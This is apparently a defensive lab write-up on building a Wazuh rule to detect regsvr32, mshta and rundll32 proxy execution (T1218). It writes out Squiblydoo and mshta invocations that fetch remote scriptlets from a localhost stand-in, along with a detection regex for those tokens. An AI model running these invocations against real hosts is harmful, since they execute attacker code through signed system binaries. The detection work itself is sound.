# Lab 03 - Defense Evasion: LOLBin Proxy Execution (T1218)

## Objective
Detect an attacker abusing signed, built-in Windows binaries - `regsvr32`,
`mshta`, `rundll32` - to run code that lives off the land, and discover in the
process that the shipped ruleset has **zero coverage for `regsvr32`**, catches
`mshta` **only when Office is the parent**, and that a hardened endpoint's
**AMSI** and **Defender** each neutralize a *different* variant of the attack
before the SIEM ever sees it - leaving the detection to catch the quieter forms
that slip past both.

A **LOLBin** ("living off the land binary") is a Microsoft-signed executable
already present on every Windows host that an attacker repurposes to execute
code. Because the binary is trusted and signed, application allow-listing waves
it through, and its mere presence in a process list looks normal. The tell is not
the binary - it is the *arguments*: a signed `regsvr32` registering a local DLL
is routine; a `regsvr32` fetching a remote scriptlet is
**T1218.010 (Squiblydoo)**.

**System Binary Proxy Execution** is the ATT&CK name for the whole family: the
attacker "proxies" their code through a trusted binary. This lab targets the
three most abused: `regsvr32` (scriptlet COM / Squiblydoo), `mshta` (remote HTA),
and `rundll32` (protocol handlers). The detection keys on the argument, not the
image name, which is what separates the attack from the millions of legitimate
LOLBin invocations a Windows host makes.

## MITRE ATT&CK
| Field | Value |
|---|---|
| Tactic | Defense Evasion, Execution |
| Technique | T1218 - System Binary Proxy Execution |
| Sub-techniques | T1218.010 (Regsvr32), T1218.005 (Mshta), T1218.011 (Rundll32) |
| Related | T1059 - Command and Scripting Interpreter (the proxied payload) |
| Reference | https://attack.mitre.org/techniques/T1218/ |

## Environment
| Component | Details |
|---|---|
| Endpoint | Windows 11 - agent ID 002 `windows` |
| Manager | Ubuntu Server, Wazuh 4.14.6 all-in-one |
| Sensor | Sysmon v15.21, SwiftOnSecurity config |
| Event | Sysmon **Event ID 1** - ProcessCreate |
| Custom rule | **100501** (level 12), `local_rules.xml` |

Unlike Lab 02, this lab needs **no config amendment** - `ProcessCreate` (EID 1)
is the one event the SwiftOnSecurity baseline logs enthusiastically. The gap here
is not the sensor; it is the shipped *rules* built on top of it.

## What the shipped ruleset covers - and does not
Grepped across `/var/ossec/ruleset/rules/` for each LOLBin:

| LOLBin | Sub-tech | Shipped coverage |
|---|---|---|
| `regsvr32` | T1218.010 | **None.** No rule anywhere matches regsvr32 command lines. |
| `mshta` | T1218.005 | Rules 92047 / 92048 - **but only when the parent is `winword`/`excel`/`powerpnt`.** |
| `rundll32` | T1218.011 | Only narrow cases (`.lock` files, a suspicious-extension rule) - not the `javascript:` / remote-scriptlet form. |

The `mshta` gap is the instructive one. The shipped rule assumes the attack
arrives as a malicious Office macro spawning `mshta`. That was the 2018 playbook.
A `mshta` launched from a shell, a scheduled task, a `.lnk`, or any non-Office
parent - all common today - matches nothing. **Coverage tied to a specific parent
is coverage an attacker removes by choosing a different parent.**

## The detection signal - argument, not image
Every LOLBin abuse shares one property: the trusted binary is asked to reach a
**remote resource** or execute a **scriptlet / script protocol**. Legitimate use
almost never does. The captured Sysmon EID 1 fields make this directly
observable:

| Field | Why it matters |
|---|---|
| `originalFileName` | The name baked into the PE version resource - `REGSVR32.EXE` even if the file on disk is renamed. Renaming the binary defeats an `image`-path match; it does **not** defeat this. |
| `commandLine` | Carries the tell: `scrobj`, `.sct`, `http://`, `javascript:`, `vbscript:`. |
| `parentImage` | Context, deliberately **not** the trigger (see below). |

## Attack simulation - four LOLBin invocations, two blocked by the endpoint
Run as the hands-on operator on the live endpoint. Every URL points at
`127.0.0.1` with nothing listening, so each fetch fails - the **process still
launches and Sysmon still records it**, which is all the detection needs. The
payload never has to succeed.

### The staging attempt - blocked by AMSI
The first step was to write a scriptlet (`.sct`) file for `regsvr32` to load.
Authoring it through a PowerShell here-string was blocked outright:

```
This script contains malicious content and has been blocked by your antivirus
software.  (ScriptContainedMaliciousContent)
```

The **Antimalware Scan Interface (AMSI)** scanned the scriptlet's *content as
PowerShell processed the string* and refused it before the file was ever written
to disk. The Defender Operational log named it:

```
Backdoor:JS/Relvelshe.A   Path: amsi:_...\powershell.exe   Action: Quarantine
```

**First layered-defense finding.** AMSI blocks the attack at the *authoring*
layer - a different layer than Lab 02, where Defender blocked *execution*. The
`.sct` file never existed. As shown next, the detection does not depend on it.

### P1 - regsvr32 scriptlet COM (Squiblydoo, T1218.010), reaches the SIEM
```powershell
regsvr32.exe /s /u /i:C:\Tools\lab03_squiblydoo.sct scrobj.dll
```

`scrobj.dll` is the Microsoft Script Component runtime; `/i:` passes it a
scriptlet to execute. With the `.sct` blocked by AMSI, `regsvr32` launched
against a non-existent file and exited silently under `/s`. **The process was
created, so Sysmon emitted EID 1 with the full command line** - `scrobj.dll` and
`/i:` present. That invocation pattern is the detection target, and it is present
whether or not the payload loads.

### P2 - regsvr32 remote scriptlet, blocked by Defender at execution
```powershell
regsvr32.exe /s /n /u /i:http://127.0.0.1/lab03.sct scrobj.dll
```

This one produced **no Sysmon EID 1 at all**. Not a telemetry gap - the process
was never created. The Defender Operational log (events 1116 detected / 1117
remediated) named it:

```
Trojan:Win32/Powemet.A!attk
Path: CmdLine:_C:\Windows\System32\regsvr32.exe /s /n /u /i:http://127.0.0.1/lab03.sct scrobj.dll
Action: Remove
```

The **`CmdLine:_` path prefix** is the point: Defender matched on the *command
line itself*, not a file on disk. The remote-scriptlet form is a
high-confidence signature, and Defender terminates it before the process spawns.

**Second layered-defense finding, and the headline.** The *loudest* Squiblydoo
variant - the remote fetch - is the one Defender reliably kills pre-execution, so
the SIEM never sees it. The variant that slips past AMSI and Defender and reaches
the SIEM is the *quieter* local-scriptlet form (P1). That is precisely what the
detection must catch, and it is the argument for why the SIEM rule earns its
place next to the EDR: layered controls each catch a different variant, and none
is complete alone.

### P3 - mshta fetching a remote payload (T1218.005), reaches the SIEM
```powershell
mshta.exe http://127.0.0.1/lab03.hta
```

`mshta` executes HTML Applications - HTML plus embedded script, run outside the
browser sandbox. A remote HTA is a classic delivery vehicle. This launched
cleanly and produced EID 1. **Parent was `powershell.exe`** (because it was run
from a shell) - which is exactly the parent the shipped rule 92047 does **not**
cover, so nothing shipped fired on it.

### The parent-child trap, deliberately not used as the trigger
The captured events show `parentImage = powershell.exe`. In a real macro attack
it would be `winword.exe`; from a scheduled task, `taskeng.exe`; from a `.lnk`,
`explorer.exe`. Building the rule on "LOLBin spawned by Office" - the shipped
approach - catches one delivery method and misses the rest. **Keying on the
command-line argument catches the technique regardless of which parent the
attacker chooses.** Parent-child is investigation context, not the detection
signal.

## Detection rule (on the manager)
Added to `/var/ossec/etc/rules/local_rules.xml`.

```xml
<group name="local,windows,defense_evasion,">
  <rule id="100501" level="12">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.originalFileName" type="pcre2">(?i)^(regsvr32|mshta|rundll32)\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)(scrobj|\.sct\b|https?://|javascript:|vbscript:)</field>
    <options>no_full_log</options>
    <description>LOLBin proxy execution [T1218]: $(win.eventdata.originalFileName) ran a remote/scriptlet payload - $(win.eventdata.commandLine)</description>
    <mitre>
      <id>T1218.010</id>
      <id>T1218.005</id>
      <id>T1218.011</id>
      <id>T1059</id>
    </mitre>
  </rule>
</group>
```

Design, each choice mapped to a decision an interviewer will probe:

- **`originalFileName`, not `image`.** The value comes from the PE version
  resource, so renaming `regsvr32.exe` to `svchost.exe` on disk does not evade
  it. The captured events confirm the field is populated (`REGSVR32.EXE`,
  `MSHTA.EXE`).
- **Two ANDed fields.** The LOLBin identity *and* a remote/scriptlet argument.
  The second field is the entire discriminator - it is why the attacks fire and
  benign local DLL registration stays silent.
- **Command-line detection, not parent-child.** Survives the attacker choosing
  any parent (see the trap above).
- **`if_group sysmon_event1`.** EID 1's shipped group has **no** underscore
  (contrast EID 10's `sysmon_event_10` in Lab 02) - chaining to the wrong form
  silently never fires.
- **Custom group `defense_evasion`** shares no substring with the parent group,
  so `if_group` cannot self-match.
- **Level 12.** No sibling race exists to lever here - regsvr32 has zero shipped
  coverage and shipped `mshta` cannot match a non-Office parent, so 100501 is the
  sole matcher on these events. Severity is pure signal, not a precedence tool as
  it was for 100500 in Lab 02.

## Detection results - full test matrix
All four attack invocations, plus benign negative controls, on the live endpoint:

| Input | Reached SIEM? | Rule | Level | Verdict |
|---|---|---|---|---|
| P1 `regsvr32 …/i:C:\Tools\…sct scrobj.dll` | yes (Sysmon EID 1) | **100501** | 12 | true positive |
| P3 `mshta http://127.0.0.1/lab03.hta` | yes (Sysmon EID 1) | **100501** | 12 | true positive |
| P2 `regsvr32 …/i:http://…sct scrobj.dll` | no - Defender `Powemet.A!attk` removed it | - | - | blocked pre-exec |
| `.sct` authoring | no - AMSI `Relvelshe.A` quarantined it | - | - | blocked pre-exec |
| N1 `regsvr32 /s C:\Windows\System32\shell32.dll` | yes (Sysmon EID 1) | 67027 | 3 | **silent - correct** |
| N2 `rundll32 shell32.dll,Control_RunDLL` | yes (Sysmon EID 1) | 67027 | 3 | **silent - correct** |

Confirmed on the manager: exactly **two** 100501 alerts (P1, P3), and the benign
LOLBins landed as the generic level-3 process-creation rule **67027**, never
escalating. The rule discriminates on the *argument*, not the binary name.

### The two-sensor observation - and why it is not a double-fire
Every process creation appeared twice in `alerts.json`: once with
`originalFileName` populated (Sysmon EID 1) and once with it absent
(`67027`, from the **Security 4688** "A process was created" event - a separate
sensor). Checking the source `eventRecordID` of every malicious-command-line
alert proved **no single event fired both rules** - the record IDs are disjoint.
The endpoint simply logs each action through two independent channels, and only
the Sysmon copy carries the fields 100501 needs, so only it escalates. This is
the practical reason to build on the richer sensor: `originalFileName` exists in
Sysmon EID 1 and not in Security 4688.

## Investigation steps
1. **Treat a 100501 alert as attempted code execution through a trusted binary.**
   The signed LOLBin is not the anomaly; the remote/scriptlet argument is.
2. **Read the command line in the alert.** `scrobj`/`.sct` = Squiblydoo;
   `http(s)://` = remote fetch; `javascript:`/`vbscript:` = protocol-handler
   abuse. The specific token tells you the sub-technique.
3. **Pivot on the parent process.** `parentImage` is in the event. An Office app,
   a shell, or a scheduled task spawning a LOLBin that reaches the network is the
   delivery method - reconstruct it backward.
4. **Check whether the payload was blocked.** Correlate the Defender Operational
   log (1116/1117) around the same second - the remote form is often removed
   pre-execution, and a 100501 with no matching block means the quieter form got
   through.

## Notes and limitations
- **The detection fires on the invocation, not payload success.** P1 was caught
  even though AMSI had already blocked its `.sct` and the payload never loaded.
  The command-line shape is the signal; this is a strength (it catches attempts)
  and a caveat (a 100501 alert is not proof of successful execution).
- **AMSI and Defender are the frontline; the SIEM rule is the backstop.** On this
  hardened endpoint, the remote scriptlet and the scriptlet authoring were both
  blocked before the SIEM saw them. The rule matters for the local/standalone
  forms that slip past, and for hosts where AMSI/Defender are weakened or absent.
- **`https?://` can theoretically false-positive.** A legitimate `mshta` or
  `rundll32` invoked with a URL would alert. Both are rare enough that the alert
  is worth raising; a production tune would allow-list known-good command lines by
  hash or full string.
- **Enumerated tokens are not exhaustive.** UNC paths (`\\server\share`), other
  script protocols, and obfuscated arguments could evade the argument regex.
  Adding indicators is the ongoing tuning loop.
- **`Get-MpThreatDetection` is not the authoritative Defender record.** It
  returned empty for the P2 block because it clears an entry once the threat is
  *remediated*. The **Defender Operational log** (events 1116/1117) is the ground
  truth and is where the `Powemet` and `Relvelshe` detections were found.

## Lessons learned
- **The binary is trusted; the arguments are the attack.** Detection built on the
  image name alone (allow-list a LOLBin, or alert that one ran) is useless -
  these binaries run constantly and legitimately. The remote/scriptlet argument
  is the entire signal.
- **Coverage bound to a parent is coverage an attacker discards.** The shipped
  `mshta` rule catches only the Office-macro delivery. Keying on the command line
  catches the technique across every delivery method.
- **`originalFileName` beats `image` for LOLBins.** Renaming the binary is a
  trivial evasion of a path match and a non-evasion of the PE-resource name.
- **Modern endpoints defend in depth, at different layers.** AMSI blocked
  authoring; Defender blocked the remote execution; the SIEM catches the local
  form. Three controls, three different variants - and a homelab whose endpoint
  lacked AMSI/Defender would "detect" everything and learn the wrong lesson about
  what actually stops the attack.
- **Read the right Defender log.** A single cmdlet (`Get-MpThreatDetection`)
  showed nothing while the Operational log showed two named detections. Knowing
  where the authoritative record lives is a forensics skill, not a detail.

## MITRE ATT&CK mapping
```
System Binary Proxy Execution (T1218)
  |
  +-- .sct authoring          --> AMSI quarantine (Backdoor:JS/Relvelshe.A)  [blocked, no process]
  +-- regsvr32 /i:http (remote) --> Defender remove (Trojan:Win32/Powemet.A!attk) [blocked, no EID 1]
  |
  +-- regsvr32 /i:local.sct scrobj.dll  (T1218.010)  --> Sysmon EID 1
  +-- mshta http://... (T1218.005, non-Office parent) --> Sysmon EID 1
        |
        +--> sysmon_event1  (process creation, level 0)
               |
               +--> 100501  L12  originalFileName in {regsvr32,mshta,rundll32}
                      AND commandLine has scrobj/.sct/http/javascript/vbscript
                      [fires on local scriptlet + standalone mshta; silent on benign regsvr32/rundll32]
```

## Status
Complete - custom rule **100501** (level 12) confirmed firing on a live Windows 11
endpoint for both `regsvr32` scriptlet-COM execution (Squiblydoo, T1218.010) and a
standalone `mshta` remote fetch (T1218.005) that the shipped rule 92047 misses
because its parent is not an Office application, while staying silent on benign
`regsvr32` DLL registration and normal `rundll32` usage (both classified as the
generic level-3 rule 67027).

The lab documented that the shipped ruleset has **no `regsvr32` coverage at all**,
catches `mshta` only under an Office parent, and covers only narrow `rundll32`
cases; that the endpoint's **AMSI** and **Defender** each block a different
variant before it reaches the SIEM (the `.sct` authoring via
`Backdoor:JS/Relvelshe.A`, and the remote scriptlet via `Trojan:Win32/Powemet.A!attk`,
found in the Defender Operational log after `Get-MpThreatDetection` reported
nothing); and that keying the detection on `originalFileName` plus a
remote/scriptlet command-line indicator - rather than on the parent process -
catches the technique regardless of delivery method. `logall_json` was not needed
to validate a level-12 rule (its alerts land in `alerts.json` directly) and was
left disabled after this lab; Lab 04 re-enables it to read EID 7 field names.
```
